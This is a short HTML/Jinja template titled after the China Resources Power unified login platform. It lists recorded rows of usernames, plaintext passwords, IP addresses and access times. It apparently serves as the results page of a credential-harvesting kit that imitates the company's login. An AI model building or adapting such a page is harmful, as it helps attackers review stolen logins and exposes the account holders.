<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>华润电力统一登录平台</title>


<style>
	.loginlist ul{
	padding: 2px;
	margin: 5px auto 0px auto;
	border:1px solid #000;
	width: 90%;
	height: 24px;
}
	.loginlist ul li{
	width: 25%;
	float: left;
	height: 24px;
	color: #000;
	
}
	ul,ol{list-style:none;}

</style>


</head>
<body class="lo_body">
<div class="loginlist">



	{% for row in rows %}
	<ul>
		<li>用户名:{{ row[0] }}</li>
		<li>密码:{{ row[1] }}</li>
		<li>IP:{{ row[2] }}</li>
		<li>访问时间:{{ row[3] }}</li>
	</ul>
	{% endfor %}




</div>

</body></html>
